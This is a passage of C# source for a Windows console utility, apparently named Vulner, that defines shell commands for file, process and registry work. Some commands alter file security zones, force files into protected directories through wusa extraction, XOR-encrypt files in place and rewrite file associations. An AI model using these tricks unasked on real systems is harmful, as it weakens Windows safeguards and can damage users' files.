                        foreach (KeyValuePair<Char, FileAttributes> kp in AllAttr)
                        {
                            if ((fa & kp.Value) == kp.Value)
                            {
                                fi += kp.Key;
                                continue;
                            }
                            fi += "-";
                        }
                        t.ColorWrite("$a{0} {1}", fi, fl.Name);
                    }
                    return null;
                },
            }.Save(C, new string[] { "attrib" });
            #endregion
            #region Self Command
            new Command
            {
                Help = new CommandHelp
                {
                    Description = "Prints location of vulner.exe",
                    Usage = Util.Array("{NAME}")
                },
                Main = (Argumenter a) =>
                {
                    string r = new FileInfo(Environment.GetCommandLineArgs()[0]).FullName;
                    if (a.ExpectsOutput) return r;
                    t.ColorWrite("$a{0}", r);
                    return r;
                },
            }.Save(C, new string[] { "self" }, __debug__);
            #endregion
            #region Zone Command
            new Command
            {
                Help = new CommandHelp
                {
                    Description = "Changes 'zones' of files\nWhich changes how windows behaves when you run them",
                    LongDesc = @"Zones:
""local""
""intranet""
""trusted""
""internet"" ""unsafe""
""untrusted"" ""locked""",
                    Usage = Util.Array("{NAME} [file match] [zone]"),

                },
                Main = (Argumenter a) =>
                {
                    int l = 0;
                    string cm = a.Get(2).ToLower();
                    Dictionary<string, int> d = new Dictionary<string, int>
                    {
                            { "local", 0 },
                            { "intranet", 1 },
                            { "trusted", 2 },
                            { "internet", 3 },
                            { "untrusted", 4 },

                            { "unsafe", 3 },
                            { "locked", 4 },
                    };

                    if (d.ContainsKey(cm))
                    {
                        l = d[cm];
                    }
                    else
                    {
                        if (!int.TryParse(cm, out l))
                        {
                            return null;
                        }
                    }

                    /*
                        LOCAL_MACHINE = 0,
                        INTRANET = 1,
                        TRUSTED = 2,
                        INTERNET = 3,
                        UNTRUSTED = 4,
                    */

                    foreach (string s in a.Parsed.StringArray())
                    {
                        foreach (string arg in Funcs.GetFilesSmarty(s, false))
                        {
                            try
                            {
                                FileInfo f = Funcs.Fi(arg);
                                if (Funcs.SetZone(f, l))
                                {
                                    t.ColorWrite("$a{0}", arg);
                                }
                                else
                                {
                                    t.ColorWrite("$c{0}", arg);
                                }
                            }
                            catch (Exception)
                            {
                                t.ColorWrite("$c{0}", arg);
                            }
                        }
                    }
                    return null;
                },
            }.Save(C, new string[] { "zone" }, __debug__);
            #endregion
            #region HexDump Command
            new Command
            {
                Help = new CommandHelp
                {
                    Description = "Does a hexdump of the first argument",
                    Examples = Util.Array("{NAME} 'test string'")
                },
                Switches = new string[] { "f" },
                Main = (Argumenter a) =>
                {
                    char f = '8';
                    t.SetForeColor(f);
                    Dictionary<char, char> repl = new Dictionary<char, char>()
                    {
                        { '\t', '↔' },
                        { '\n', '↕' },
                        { '\r', '¶' }
                    };
                    Regex rg = new Regex("[\x20-\x7E\x80-\xFE]", RegexOptions.IgnoreCase);
                    byte[] b = null;
                    UserVar u = a.Parsed[1];
                    if (u.Type() == typeof(byte[]))
                    {
                        b = u.Get<byte[]>();
                    }
                    else
                    {
                        b = u.Get<string>().Select(o => (byte)o).ToArray();
                    }
                    if (a.GetSw("f"))
                    {
                        try
                        {
                            b = System.IO.File.ReadAllBytes(Path.Combine(Environment.CurrentDirectory, a.Get(1)));
                        }
                        catch (Exception)
                        {
                            t.ColorWrite("$cFile not found.");
                            return null;
                        }
                    }

                    int p = 0;
                    int l = 16;
                    t.WriteLine();
                    t.Write("".PadRight(8 + 3));
                    for (int i = 0; i < 16; i++)
                    {
                        t.Write("{0} ", i.ToString("X2"));
                    }
                    while (p < b.Length)
                    {
                        t.SetForeColor(f);
                        t.WriteLine();
                        t.Write("  {0} ", p.ToString("X8"));
                        int c = 0;
                        for (int i = 0; i < l; i++)
                        {
                            if (p + i >= b.Length) { break; }
                            t.Write("{0} ", ((byte)b[p + i]).ToString("X2"));
                            c++;
                        }
                        t.Write("".PadRight((l - c) * 3));
                        for (int i = 0; i < l; i++)
                        {
                            if (p + i >= b.Length) { break; }
                            char ch = (char)b[p + i];

                            t.SetForeColor(f);
                            if (repl.ContainsKey(ch))
                            {
                                ch = repl[ch];
                                t.SetForeColor('f');
                            }
                            else
                            {
                                if (!rg.IsMatch(ch.ToString()))
                                {
                                    ch = '.';
                                }
                            }

                            t.Write("{0}", ch);
                        }
                        p += l;
                    }

                    t.WriteLine();

                    return null;
                },
            }.Save(C, new string[] { "hexdump" }, __debug__);
            #endregion
            #region Fi Command ( File Info )
            new Command
            {
                Help = new CommandHelp
                {
                    Description = "Gets file information",
                    Examples = Util.Array(
                        "fi file.exe",
                        "fi file.exe -m '^[a-z]+\\.[a-z]{3}' $8Uses regex to find strings inside the file"
                    )
                },
                Parameters = new string[] { "m", "s" },
                Main = (Argumenter a) =>
                {
                    string f = a.Get(1);
                    FileInfo fi = null;
                    try
                    {
                        {
                            FileInfo ftemp = null;
                            if ((ftemp = new FileInfo(f)).Exists) { fi = ftemp; }
                            if ((ftemp = new FileInfo(Path.Combine(Environment.CurrentDirectory, f))).Exists) { fi = ftemp; }
                            foreach (string s in Environment.GetEnvironmentVariable("path").Split(';'))
                            {
                                if ((ftemp = new FileInfo(Path.Combine(s, f))).Exists) { fi = ftemp; }
                            }
                        }
                    }
                    catch (IOException) { t.ColorWrite("$cFile not found."); return null; }
                    if (Equals(fi, null))
                    {
                        t.ColorWrite("$cFile not found.");
                        return null;
                    }
                    else
                    {
                        if (a.GetPr("m") != string.Empty)
                        {
                            Regex r = null;
                            try
                            {
                                r = new Regex(string.Format("({0})", a.GetPr("m")), RegexOptions.IgnoreCase);
                            }
                            catch (Exception)
                            {
                                t.ColorWrite("$cInvalid regex");
                                return null;
                            }
                            string ft = System.IO.File.ReadAllText(fi.FullName);
                            Dictionary<string, object[]> h = new Dictionary<string, object[]>();
                            int span = a.Int("s", 0);
                            MatchCollection all = Regex.Matches(ft, "([\x20-\x7E\x80-\xFE]{5,99999})");
                            int vi = 0;
                            foreach (Match v in all)
                            {
                                string match = v.Groups[1].Value;
                                Match ma = null;
                                if ((ma = r.Match(match)).Success)
                                {
                                    Group g = ma.Groups[1];

                                    int i = g.Index;
                                    int l = g.Length;

                                    string pre = match.Substring(0, i).Replace("$", "$$");
                                    string mid = match.Substring(i, l).Replace("$", "$$");
                                    string pos = match.Substring(i + l, match.Length - (i + l)).Replace("$", "$$");

                                    if (span != 0)
                                    {
                                        t.WriteLine();
                                        for (int k = 0; k < span; k++)
                                        {
                                            try
                                            {
                                                t.ColorWrite("$8{0}", all[vi - span + k].Value);
                                            }
                                            catch (ArgumentOutOfRangeException) { }
                                        }
                                    }
                                    t.ColorWrite("$f{0}$a{1}$f{2}", pre, mid, pos);

                                    if (span != 0)
                                    {
                                        for (int k = 0; k < span; k++)
                                        {
                                            try
                                            {
                                                t.ColorWrite("$8{0}", all[vi + k + 1].Value);
                                            }
                                            catch (ArgumentOutOfRangeException) { }
                                        }
                                    }
                                }
                                vi++;
                            }
                            return null;
                        }
                        t.ColorWrite("$eFull path: $f{0}", fi.FullName);
                        t.ColorWrite("$eFull name: $f{0}", fi.Name);
                        t.ColorWrite("$eSize: $f{0} bytes", fi.Length);
                        t.ColorWrite("$eAttribs: $f{0}", fi.Attributes);

                        t.WriteLine();

                        t.ColorWrite("$aCreation time: $f{0}", fi.CreationTime);
                        t.ColorWrite("$aAccess time: $f{0}", fi.LastAccessTime);
                        t.ColorWrite("$aWrite time: $f{0}", fi.LastWriteTime);

                        t.ColorWrite("$aCreation time UTC: $f{0}", fi.CreationTimeUtc);
                        t.ColorWrite("$aAccess time UTC: $f{0}", fi.LastAccessTimeUtc);
                        t.ColorWrite("$aWrite time UTC: $f{0}", fi.LastWriteTimeUtc);

                        t.WriteLine();

                        try
                        {
                            if (fi.Length >= 10)
                            {
                                byte[] b = new byte[20];
                                fi.OpenRead().Read(b, 0, 20);
                                string op = "#!%‰abcdefghijklmnopqrstuvxwyzABCDEFGHIJKLMNOPQRSTUVXWYZ0123456789";
                                string mg = new string(b.TakeWhile(i => op.Contains((char)i)).Select(i => (char)i).ToArray());
                                if (mg.Length < 10)
                                {
                                    if (Regex.IsMatch(mg, "^[a-z0-9]+$", RegexOptions.IgnoreCase))
                                    {
                                        t.ColorWrite("$cMagic number: $f{0}", mg.ToUpper());
                                        t.WriteLine();
                                    }
                                }
                            }
                        }
                        catch (Exception) { }
                    }
                    return null;
                },
            }.Save(C, new string[] { "fi" }, __debug__);
            #endregion
            #region Crypto Command
            new Command
            {
                Help = new CommandHelp
                {
                    Description = "Simple two way cryptography",
                    Usage = new string[] { "{NAME} [filename]" },
                    Examples = new string[]
                    {
                                    "{NAME} File.txt",
                                    "{NAME} File.txt /pw password"
                    }
                },
                Parameters = new string[]
                {
                                "pw"
                },
                Main = (Argumenter a) =>
                {
                    byte[] ip = (a.GetPr("pw", "") + "\xF4VULNEr").ToCharArray().Select(b => (byte)b).ToArray();
                    byte[] pw = SHA1.Create().ComputeHash(ip);

                    foreach (string b in a.Parsed.StringArray())
                    {
                        try
                        {
                            byte[] f = System.IO.File.ReadAllBytes(b);
                            byte r = (byte)0;
                            for (int i = 0; i < f.Length; i++)
                            {
                                r = pw[i % pw.Length];
                                f[i] = (byte)(f[i] ^ (byte)(i * (13 + r)) ^ r);
                            }
                            System.IO.File.WriteAllBytes(b, f);
                            t.ColorWrite("Cryptographed $a{0} $8({1} bytes)", new FileInfo(b).FullName, f.Length);
                        }
                        catch (Exception) { }
                    }
                    return null;
                },
            }.Save(C, new string[] { "crypto" });
            #endregion
            #region Insert Command
            new Command
            {
                Help = new CommandHelp
                {
                    Description = "Forces a file into any directory",
                    Usage = new string[] { "{NAME}" }
                },
                Main = (Argumenter a) =>
                {

                    FileInfo In = null;
                    FileInfo Out = null;
                    try
                    {
                        In = new FileInfo(Environment.ExpandEnvironmentVariables(a.Get(1)));
                        Out = new FileInfo(Environment.ExpandEnvironmentVariables(a.Get(2)));
                    }
                    catch (Exception)
                    {
                        t.WriteLine("Syntax:\n\tINSERT [FILENAME] [FOLDER]");
                    }

                    FileInfo Tmp = new FileInfo(Path.Combine(Environment.ExpandEnvironmentVariables("%temp%"), Funcs.RandomString(10) + ".cab"));

                    t.WriteLine("Compacting...");
                    Process.Start(new ProcessStartInfo
                    {
                        FileName = "makecab.exe",
                        Arguments = string.Format("\"{0}\" \"{1}\" /V1", In.FullName, Tmp.FullName),
                        WindowStyle = ProcessWindowStyle.Hidden,
                        CreateNoWindow = true
                    }).WaitForExit();

                    t.WriteLine("Extracting...");
                    Process.Start(new ProcessStartInfo
                    {
                        FileName = "wusa.exe",
                        Arguments = string.Format("\"{0}\" /extract:\"{1}\" /log:\"F:/wusa_log.txt\" /quiet", Tmp.FullName, Out.FullName),
                        WindowStyle = ProcessWindowStyle.Hidden,
                        CreateNoWindow = true
                    }).WaitForExit();

                    Tmp.Delete();

                    FileInfo Fo = new FileInfo(Path.Combine(Out.FullName, In.Name));
                    if (Fo.Exists)
                    {
                        t.ColorWrite("$aFile created: {0}", Fo.FullName);
                    }
                    else
                    {
                        t.ColorWrite("$cFailed to create file: {0}", Fo.FullName);
                    }
                    return null;
                },
            }.Save(C, new string[] { "insert" });
            #endregion
            #region Fake Command
            new Command
            {
                Help = new CommandHelp
                {
                    Description = "Populates a folder with fake files",
                    Usage = new string[] {
                        "{NAME} [Subfolder count]"
                    },
                    Examples = new string[] {
                        "{NAME}",
                        "{NAME} 4",
                    }
                },
                Main = (Argumenter a) =>
                {
                    int c = a.Int(1, 0);
                    if (c <= 0) { c = 2; }

                    List<string> dirs = new List<string>() { "" };
                    List<string> fils = new List<string>();

                    string[] Frmt = new string[]
                    {
                        "txt", "pptx", "docx", "exe", "bat", "exe", "msi", "vbs", "bat",  "doc", "png", "jpg", "jpeg",
                        "gif", "bmp",  "dll",  "sys", "bat", "msc", "ico", "js",  "html", "php", "hta", "css", "mp3",
                        "wav", "mp4",  "avi",  "mkv", "svg"
                    };

                    Func<string, bool, int> f = null;
                    f = (str, last) =>
                    {
                        if (!last)
                        {
                            for (int i = 0; i < Funcs.Rnd(4, 6); i++)
                            {
                                string s = Funcs.MakeWord();
                                Directory.CreateDirectory(Path.Combine(str, s));
                                dirs.Add(Path.Combine(str, s));
                            }
                        }
                        for (int i = 0; i < Funcs.Rnd(10, 25); i++)
                        {
                            string s = Funcs.MakeWord();
                            System.IO.File.WriteAllBytes(string.Format("{0}.{1}", Path.Combine(str, s), Funcs.PickRnd(Frmt)), Funcs.RandomBytes(100, 1000000));
                            fils.Add(Path.Combine(str, s));
                        }
                        return 0;
                    };

                    int cnt = 0;
                    int nc = 0;
                    for (int i = 0; i < c; i++)
                    {
                        nc = dirs.Count;
                        List<string> d = dirs.Skip(cnt).ToList();
                        foreach (string s in d)
                        {
                            f.Invoke(s, i == c);
                        }
                        cnt += nc;
                    }

                    t.ColorWrite("$aCreated {0} directories and {1} files.", dirs.Count, fils.Count);

                    return null;
                },
            }.Save(C, new string[] { "fake" });
            #endregion
            #region Install Command
            new Command
            {
                Switches = Util.Array("a"),
                Help = new CommandHelp
                {
                    Description = "Installs Vulner",
                    LongDesc = "Copies Vulner to Windows directory and sets file associations for .fal files",
                    Usage = new string[]
                    {
                        "{NAME}"
                    }
                },
                Main = (Argumenter a) =>
                {
                    string path = Environment.ExpandEnvironmentVariables("%windir%\\Vulner.exe");
                    try
                    {
                        FileInfo f = new FileInfo(path);
                        if (f.Exists) f.Delete();
                        new FileInfo(m.FileName).CopyTo(path);

                        m.RunCommand("assoc 'fal=Vulner' 'fal.Open=Vulner.exe \"%1\" %*' ");
                        m.RunCommand("reg HKCR/Vulner/DefaultIcon/=%SystemRoot%\\Vulner.exe,1");
                        m.RunCommand("reg HKCU/Console/%SystemRoot%_Vulner.exe/QuickEdit=1");
                        if (!a.GetSw("a"))
                        {
                            Process.Start(f.FullName);
                            Environment.Exit(0);
                        }
                    }
                    catch (Exception e)
                    {
                        return Error(e);
                    }
                    return null;
                },
            }.Save(C, new string[] { "install" }, __debug__);
            #endregion
            #region Dr Command ( DRives )
            new Command
            {
                Help = new CommandHelp
                {
                    Description = "Gets information about drives",
                    Examples = Util.Array("{NAME}")
                },
                Main = (Argumenter a) =>
                {
                    DriveInfo[] dr = DriveInfo.GetDrives();
                    foreach (DriveInfo d in dr)
                    {
                        t.ColorWrite("$e{0} => " + (d.IsReady ? "$aReady" : "$cNot Ready"), d.Name);
                        if (d.IsReady)
                        {
                            t.ColorWrite(" $f{0} = $a{1}", "Directory", d.RootDirectory);
                            t.ColorWrite(" $f{0} = $a{1}", "Label", d.VolumeLabel);
                            t.ColorWrite(" $f{0} = $a{1}", "Format", d.DriveFormat);
                            t.ColorWrite(" $f{0} = $a{1}", "Type", d.DriveType);
                        }
                        t.WriteLine();
                    }
                    return null;
                },
            }.Save(C, new string[] { "dr" }, __debug__);
            #endregion
            #region DF Command ( Dummy File )
            new Command
            {
                Help = new CommandHelp
                {
                    Description = "Creates a file of random bytes with given length",
                    Usage = Util.Array("{NAME} [name] [length]")
                },
                Main = (Argumenter a) =>
                {
                    string filn = a.Get(1);
                    int len = a.Int(2, -1);
                    if (filn.Length > 0 && len >= 0)
                    {
                        FileInfo f = new FileInfo(Path.Combine(Environment.CurrentDirectory, filn));
                        if (f.Exists) f.Delete();
                        FileStream s = f.Create();

                        byte[] bt = Funcs.RandomBytes(len);
                        s.Write(bt, 0, bt.Length);

                        s.Flush();
                        s.Close();
                        s.Dispose();
                        s = null;
                    }
                    return null;
                },
            }.Save(C, new string[] { "df" }, __debug__);
            #endregion
            #region Path Command
            new Command
            {
                Help = new CommandHelp
                {
                    Description = "Prints paths in PATH variable",
                    Usage = new string[]
                    {
                                    "{NAME}"
                    }
                },
                Main = (Argumenter a) =>
                {
                    string p = Environment.GetEnvironmentVariable("PATH");
                    foreach (string s in p.Split(';'))
                    {
                        t.ColorWrite("$a{0}", s);
                    }
                    return null;
                },
            }.Save(C, new string[] { "path" }, __debug__);
            #endregion
            #region Find Command
            new Command
            {
                Help = new CommandHelp
                {
                    Description = "Finds files in common system directories",
                    Usage = new string[]
                    {
                                    "{NAME} [file]"
                    },
                    Examples = new string[]
                    {
                                    "{NAME} cmd"
                    }
                },
                Main = (Argumenter a) =>
                {
                    string r = "";
                    string p = a.Get(1);
                    string[] frmts = new string[] { "exe", "bat", "vbs", "vb", "com", "js", "hta" };
                    foreach (string s in Environment.GetEnvironmentVariable("path").Split(';'))
                    {
                        try
                        {
                            FileInfo f = new FileInfo(Path.Combine(s, p));
                            if (f.Exists) { r = f.FullName; break; }
                        }
                        catch (Exception) { }
                        if (!p.Contains('.'))
                        {
                            foreach (string frm in frmts)
                            {
                                try
                                {
                                    FileInfo f = new FileInfo(Path.Combine(s, p + "." + frm));
                                    if (f.Exists) { r = f.FullName; break; }
                                }
                                catch (Exception) { }
                            }
                        }
                    }
                    if (r == "")
                    {
                        foreach (Environment.SpecialFolder sf in Enum.GetValues(typeof(Environment.SpecialFolder)))
                        {
                            string s = Environment.GetFolderPath(sf);
                            try
                            {
                                FileInfo f = new FileInfo(Path.Combine(s, p));
                                if (f.Exists) { r = f.FullName; break; }
                            }
                            catch (Exception) { }
                            if (!p.Contains('.'))
                            {
                                foreach (string frm in frmts)
                                {
                                    try
                                    {
                                        FileInfo f = new FileInfo(Path.Combine(s, p + "." + frm));
                                        if (f.Exists) { r = f.FullName; break; }
                                    }
                                    catch (Exception) { }
                                }
                            }
                        }
                    }
                    t.WriteLine("{0}", r);
                    return null;
                },
            }.Save(C, new string[] { "find" }, __debug__);
            #endregion
            #region Calc Command
            new Command
            {
                Help = new CommandHelp
                {
                    Description = "Parses a math expression and resolves it",
                    Usage = Util.Array("{NAME} [expression]"),
                    Examples = Util.Array("{NAME} 5 * 6", "{NAME} pow( 7, 2 ) * sin( 360 )")
                },
                Main = (Argumenter a) =>
                {
                    try
                    {
                        Expression e = new Expression(a.RawString(), EvaluateOptions.IgnoreCase);
                        object o = e.Evaluate();
                        t.ColorWrite("$a{0}", o);
                        return o;
                    }
                    catch (Exception ex)
                    {
                        t.ColorWrite("$c{0}", ex.Message);
                    }
                    return null;
                },
            }.Save(C, new string[] { "calc" }, __debug__);
            #endregion
            #region DSize Command
            new Command
            {
                Help = new CommandHelp
                {

                },
                Main = (Argumenter a) =>
                {
                    Console.CursorVisible = false;
                    Writable w = t.QuickWritable("Scanning: ", 30, 'a', 'e');
                    Writable b = t.QuickWritable("Size: ", 30, 'a', 'e');
                    long Size = 0;
                    int Err = 0;
                    DirectoryInfo D = null;
                    Action<DirectoryInfo> Calc = null;
                    int Upd = Environment.TickCount;
                    Calc = (DirectoryInfo d) =>
                    {
                        if (Environment.TickCount > Upd)
                        {
                            w.Write(Funcs.GetRelativePath(d.FullName, D.FullName));
                            b.Write(Funcs.SizeToStr(Size));
                            Upd = Environment.TickCount + 500;
                        }
                        try
                        {
                            Size += d.GetFiles().Select(f => f.Length).Sum();
                            foreach (DirectoryInfo di in d.GetDirectories()) Calc.Invoke(di);
                        }
                        catch (Exception)
                        {
                            Err += 1;
                        }
                    };
                    D = new DirectoryInfo(Path.Combine(Environment.CurrentDirectory, a.RawString()));
                    if (!D.Exists)
                    {
                        t.Error("Invalid directory");
                        return null;
                    }
                    Calc(D);
                    w.Write("Done!");
                    b.Write(Funcs.SizeToStr(Size));
                    Console.CursorVisible = true;
                    return null;
                },
            }.Save(C, new string[] { "dsize" }, __debug__);
            #endregion
            #region LNK Command
            new Command
            {
                Parameters = Util.Array("icon", "desc", "args"),
                Help = new CommandHelp
                {
                    Description = "Creates a shortcut file",
                    Usage = Util.Array("{NAME} [shortcut] [destination]"),
                    Param = new Dictionary<string, string> {
                        { "icon", "Icon" },
                        { "desc", "Description" },
                        { "args", "Arguments" }
                    },
                },
                Main = (Argumenter a) =>
                {
                    FileInfo f = null;
                    FileInfo F = null;
                    bool fil = true;
                    try
                    {
                        f = Funcs.Fi(a.Get(1));
                        if (!f.Exists) f.Create().Close();
                    }
                    catch (Exception)
                    {
                        return Error("Invalid file");
                    }
                    try
                    {
                        F = Funcs.Fi(a.Get(2));
                        if (!f.Exists) F.Create().Close();
                    }
                    catch (Exception) { fil = false; }

                    WshShell sh = new WshShell();
                    IWshShortcut lnk = (IWshShortcut)sh.CreateShortcut(f.FullName);

                    if (a.GetPr("icon") != string.Empty) lnk.IconLocation = a.GetPr("icon");
                    if (a.GetPr("desc") != string.Empty) lnk.Description = a.GetPr("desc");
                    if (a.GetPr("args") != string.Empty) lnk.Arguments = a.GetPr("args");

                    if (fil)
                        lnk.TargetPath = F.FullName;
                    else
                        lnk.TargetPath = a.Get(2);
                    lnk.Save();
                    return null;
                },
            }.Save(C, new string[] { "lnk" }, __debug__);
            #endregion
            #region Emergency Command
            new Command
            {
                Help = new CommandHelp
                {
                    Description = "Does an emergency checkup",
                    Usage = Util.Array("{NAME}")
                },
                Main = (Argumenter a) =>
                {
                    Funcs.Emergency(t, m, true);
                    return null;
                },
            }.Save(C, new string[] { "em" }, __debug__);
            #endregion
            #endregion

            #region Process Commands
            #region NI Command
            new Command
            {
                Help = new CommandHelp
                {
                    Description = "Creates a new instance of Vulner",
                    Examples = Util.Array("{NAME}")
                },
                Main = (Argumenter a) =>
                {
                    Process.Start(new ProcessStartInfo
                    {
                        FileName = m.FileName,
                        Verb = Funcs.IsAdmin() ? "runas" : ""
                    });
                    return null;
                },
            }.Save(C, new string[] { "ni" }, __debug__);
            #endregion
            #region LP Command ( Process List )
            new Command
            {
                Switches = new string[] { "d" },
                Help = new CommandHelp
                {
                    Description = "Lists processes",
                    Usage = new string[]
                    {
                                        "{NAME}",
                                        "{NAME} /d"
                    },
                    Switches = new Dictionary<string, string> { { "d", "Show Command Line" } },
                },
                Main = (Argumenter a) =>
                {
                    ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT * FROM Win32_Process");
                    t.ColorWrite("$eProcess list:");
                    string match = Regex.Escape(a.Get(1)).Replace("\\*", "[.]*").Replace("\\?", ".");
                    bool useRegex = match.Length > 0;


                    foreach (ManagementObject envVar in searcher.Get())
                    {
                        if (useRegex)
                        {
                            if (Regex.Match(envVar["name"].ToString(), match, RegexOptions.IgnoreCase).Success)
                            {
                                if (a.GetSw("d"))
                                {
                                    t.ColorWrite("$f[{0}] {1} - {2} $8{3}\n", envVar["handle"], envVar["name"], envVar["description"], envVar["commandLine"]);
                                }
                                else
                                {
                                    t.ColorWrite("$f[{0}] {1} - {2}", envVar["handle"], envVar["name"], envVar["description"]);
                                }
                            }
                        }
                        else
                        {
                            if (a.GetSw("d"))
                            {
                                t.ColorWrite("$f[{0}] {1} - {2} $8{3}\n", envVar["handle"], envVar["name"], envVar["description"], envVar["commandLine"]);
                            }
                            else
                            {
                                t.ColorWrite("$f[{0}] {1} - {2}", envVar["handle"], envVar["name"], envVar["description"]);
                            }
                        }
                    }
                    t.ColorWrite("$eEnd");
                    return null;
                },
            }.Save(C, new string[] { "pl" });
            #endregion
            #region KPID Command ( Kill Process ID )
            new Command
            {
                Help = new CommandHelp
                {
                    Description = "Kills a process with the given id",
                    Usage = new string[]
                    {
                                        "{NAME} [process id]"
                    },
                    Examples = new string[]
                    {
                                        "{NAME} 12",
                    }
                },
                Main = (Argumenter a) =>
                {
                    foreach (string ar in a.Parsed.Skip(1).StringArray())
                    {
                        Process p = null;
                        try
                        {
                            p = Process.GetProcessById(int.Parse(ar));
                        }
                        catch (Exception)
                        {
                            return Error("Invalid process id.");
                        }
                        //t.ColorWrite("$eKilling {0}...", p.ProcessName);
                        string st = string.Format("$aKilled {0}", p.ProcessName);

                        try { p.Kill(); }
                        catch (UnauthorizedAccessException) { st = "$cAccess Denied"; }
                        catch (Exception) { st = "$cError"; }
                        t.ColorWrite(st);
                    }
                    return null;
                },
            }.Save(C, new string[] { "kpid" });
            #endregion
            #region PK Command ( Process Kill )
            new Command
            {
                Help = new CommandHelp
                {
                    Description = "Kills processes that match given argument",
                    Usage = new string[]
                    {
                                        "{NAME} [process name]"
                    },
                    Examples = new string[]
                    {
                                        "{NAME} chrome",
                                        "{NAME} * $8Likely to cause a BSOD"
                    }
                },
                Main = (Argumenter a) =>
                {
                    bool suicide = false;
                    foreach (string ar in a.Parsed.Skip(1).StringArray())
                    {
                        string r = Regex.Escape(ar).Replace(@"\*", ".*").Replace(@"\?", ".");
                        foreach (Process prc in Process.GetProcesses())
                        {
                            if (Regex.Match(prc.ProcessName, r, RegexOptions.IgnoreCase).Success)
                            {
                                if (prc.Id == Process.GetCurrentProcess().Id)
                                {
                                    t.ColorWrite("$f{0}", prc.ProcessName);
                                    suicide = true;
                                    continue;
                                }
                                string st = "$aKilled";

                                try { prc.Kill(); }
                                catch (UnauthorizedAccessException) { st = "$cAccess Denied"; }
                                catch (Exception) { st = "$cError"; }

                                t.ColorWrite("$f{0} - " + st, prc.ProcessName);
                            }
                        }
                        t.WriteLine();
                    }
                    if (suicide) { Process.GetCurrentProcess().Kill(); }
                    return null;
                },
            }.Save(C, new string[] { "pk" });
            #endregion
            #region PI Command 
            new Command
            {
                Help = new CommandHelp
                {
                    Description = "Prints process info",
                    Examples = Util.Array("{NAME} cmd*")
                },
                Switches = new string[] { "m" },
                Main = (Argumenter a) =>
                {
                    Regex b = Funcs.RegexFromStr(a.Get(1));
                    Process[] pr = Process.GetProcesses().Where(pe => b.IsMatch(pe.ProcessName)).ToArray();
                    if (!a.GetSw("m"))
                        pr = pr.Take(1).ToArray();
                    foreach (Process p in pr)
                    {
                        try
                        {
                            if (p.ProcessName != "")
                            {
                                t.ColorWrite("$a[{0}] $f{1}", p.Id, p.ProcessName);
                                t.ColorWrite("$e  Memory size: $f{1}", p.Id, p.PagedMemorySize64);
                                try { t.ColorWrite("$e  Priority: $f{1}", p.Id, p.PriorityClass); } catch (Exception) { }
                                t.WriteLine();

                                try
                                {
                                    t.ColorWrite("$a  Threads:");
                                    foreach (ProcessThread th in p.Threads)
                                    {
                                        t.ColorWrite("$a    {0} - $f{1}", th.Id, th.ThreadState);
                                        t.ColorWrite("$e      Priority: - $f{1}", th.Id, th.PriorityLevel);
                                        t.ColorWrite("$e      Start time: - $f{1}", th.Id, th.StartTime);
                                        t.WriteLine();
                                    }
                                }
                                catch (Exception) { }
                                try
                                {
                                    t.ColorWrite("$a  Modules:");
                                    foreach (ProcessModule pm in p.Modules)
                                    {
                                        t.ColorWrite("$a    Modules: $f{0}", pm.ModuleName);
                                        t.ColorWrite("$e      File Name: $f{0}", pm.FileVersionInfo.FileName);
                                        t.ColorWrite("$e      Original name: $f{0}", pm.FileVersionInfo.OriginalFilename);
                                        t.ColorWrite("$e      Description: $f{0}", pm.FileVersionInfo.FileDescription);
                                        t.ColorWrite("$e      File Version: $f{0}", pm.FileVersionInfo.FileVersion);
                                        t.ColorWrite("$e      Prod Version: $f{0}", pm.FileVersionInfo.ProductVersion);
                                        t.WriteLine();
                                    }
                                }
                                catch (Exception) { }
                            }
                        }
                        catch (InvalidOperationException) { }
                    }
                    return null;
                },
            }.Save(C, new string[] { "pi" }, __debug__);
            #endregion
            #region Start Command
            new Command
            {
                ParsePR = false,
                ParseSW = false,
                Help = new CommandHelp
                {
                    Description = "Starts a process",
                    Usage = new string[]
                    {
                                        "{NAME} [file] [argument]"
                    }
                },
                Main = (Argumenter a) =>
                {
                    string cmd = a.Get(1);
                    string arg = a.Get(2);
                    try
                    {
                        Process.Start(new ProcessStartInfo
                        {
                            FileName = cmd,
                            Arguments = arg,
                            WorkingDirectory = Environment.CurrentDirectory,
                            UseShellExecute = false
                        });
                    }
                    catch (Exception ex) { return Error(ex); }
                    return null;
                },
            }.Save(C, new string[] { "start" });
            #endregion
            #region Runas Command
            new Command
            {
                ParsePR = false,
                ParseSW = false,
                Help = new CommandHelp
                {
                    Description = "Starts a process with administrator priviledges",
                    Usage = new string[]
                    {
                                        "{NAME} [file] [argument]"
                    }
                },
                Main = (Argumenter a) =>
                {
                    string cmd = a.Get(1);
                    string arg = a.Get(2);
                    try
                    {
                        Process.Start(new ProcessStartInfo
                        {
                            FileName = cmd,
                            Arguments = arg,
                            WorkingDirectory = Environment.CurrentDirectory,
                            UseShellExecute = false,
                            Verb = "runas",
                        });
                    }
                    catch (Exception ex) { return Error(ex); }
                    return null;
                },
            }.Save(C, new string[] { "runas" });
            #endregion
            #region Assoc Command
            new Command
            {
                Help = new CommandHelp
                {
                    Description = "Changes file format associations",
                    Usage = new string[]
                    {
                            "{NAME} [extension]=[name]",
                            "{NAME} '[extension].Open=[commandline]'",
                    },
                    Examples = new string[]
                    {
                            "{NAME} txt=TextFile",
                            "{NAME} 'txt.Open=Notepad.exe \"%1\" %*'",
                            "{NAME} txt=TextFile 'txt.Open=Notepad.exe \"%1\" %*'",
                            "{NAME} 'bat.Open=\"cmd.exe /c echo Bat files disabled! & pause\"'",
                    },
                    Switches = new Dictionary<string, string>()
                        {
                            { "u", "User level" },
                            { "m", "Machine level" },
                        }
                },
                Switches = new string[]
                {
                        "u",
                        "m",
                },
                Parameters = new string[]
                {
                        "hi"
                },
                Main = (Argumenter a) =>
                {
                    bool SimpleMode = false;
                    RegistryKey r = null;
                    if (a.GetSw("u") && a.GetSw("m"))
                    {
                        t.ColorWrite("Switches /u and /m are mutually exclusive!");
                        return null;
                    }
                    if (a.GetSw("u"))
                    {
                        r = Registry.CurrentUser.OpenSubKey("Software\\Classes");
                    }
                    else if (a.GetSw("m"))
                    {
                        r = Registry.LocalMachine.OpenSubKey("Software\\Classes");
                    }
                    else
                    {
                        r = Registry.ClassesRoot;
                    }
                    foreach (string ar in a.Parsed.Skip(1).StringArray())
                    {
                        string arg = ar;
                        string action = "list";
                        string attr = "";
                        string val = "";
                        bool equ = ar.Contains('=');
                        bool dot = ar.Contains('=') ? ar.Split('=')[0].Contains('.') : false;
                        if (dot && equ)
                        {
                            action = "setattr";
